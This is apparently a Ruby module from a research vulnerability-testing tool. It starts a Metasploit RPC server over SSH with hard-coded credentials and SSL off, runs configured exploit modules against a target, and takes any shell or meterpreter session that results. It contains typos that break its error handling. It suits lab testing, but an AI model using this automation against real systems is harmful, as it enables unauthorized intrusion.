# Copyright [2019] [University of Aizu]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

require 'bundler/setup'
require 'net/ssh'

require_relative './lib/haijack'
require_relative './tools/metasploit'
require_relative '../build/params'
require_relative '../ui'

class Exploit
  include ConstructionParams
  include HaijackMethod

  EXPOLIT_TIME = 300

  def initialize
    @msf_api = nil
  end

  def connect_metasploit(attack_host)
    @msf_api = Metasploit.new(attack_host)
    @msf_api.auth_login
    @msf_api.console_create
  end

  def execute_exploit(attack_host, attack_config)
    msf_modules = attack_config['metasploit_module']

    VultestUI.print_vultest_message('execute', 'Exploit attack')
    msf_modules.each do |msf_module|
      msf_module_option = module_option(attack_host, msf_module)
      msf_module_info = @msf_api.module_execute(msf_module['module_type'], msf_module['module_name'], msf_module_option)

      VultestUI.tty_spinner_begin(msf_module['module_name'])
      connection = execute_exploit_moduel(msf_module_info)
      connection ? VultestUI.tty_spinner_end('success') : Vultest.tty_spinner_end('error')
    end
  end

  def verify_exploit
    VultestUI.print_vultest_message('execute', 'Execute verify')
    VultestUI.print_vultest_message('execute', 'Brake into target machine')

    session_type = nil
    session_id = nil
    @msf_api.module_session_list.each do |key, value|
      session_id = key if value['type'] == 'meterpreter' || value['type'] == 'shell'
      session_type = value['type'] unless session_id.nil?
    end
    return if session_id.nil?

    if session_type == 'meterpreter'
      meterpreter(@msf_api, session_id)
    elsif session_type == 'shell'
      shell(@msf_api, session_id)
    end
  end

  def prepare_exploit(attack, target_env_dir, vulenv_config)
    prepare(target_env_dir, vulenv_config) if vulenv_config['construction'].key?('prepare')

    VultestUI.tty_spinner_begin('Metasploit server')
    begin
      startup_metasploit_server(attack)
    rescue StanderdError
      VultestUI.tty_spinner_end('error')
      VultestUI.print_vultest_message('caution', 'Run your attack machine now.')

      VultestUI.print_vultest_message('execute', 'If it is running now, push ENTER.')
      gets

      VultestUI.tty_spinner_begin('metasploit server')
      retry
    end
    VultestUI.tty_spinner_end('success')
  end

  private

  def module_option(attack_host, msf_module)
    msf_module_option = {}
    msf_module['options'].each { |option| msf_module_option[option['name']] = option['var'] }
    msf_module_option['LHOST'] = attack_host
    msf_module_option
  end

  def execute_exploit_moduel(module_info)
    EXPOLIT_TIME.times do
      sleep(1)
      @msf_api.module_session_list.each do |_key, value|
        return true if module_info['uuid'] == value['exploit_uuid']
      end
    end
    false
  end

  def startup_metasploit_server(attack)
    Net::SSH.start(attack[:host], attack[:user], password: attack[:passwd]) do |ssh|
      ssh.exec!("msfrpcd -a #{attack[:host]} -p 55553 -U msf -P metasploit -S false \>/dev/null 2>&1")
      ssh.exec!("msfrpcd -a #{attack[:host]} -p 55553 -U msf -P metasploit -S false")
    end
  end
end
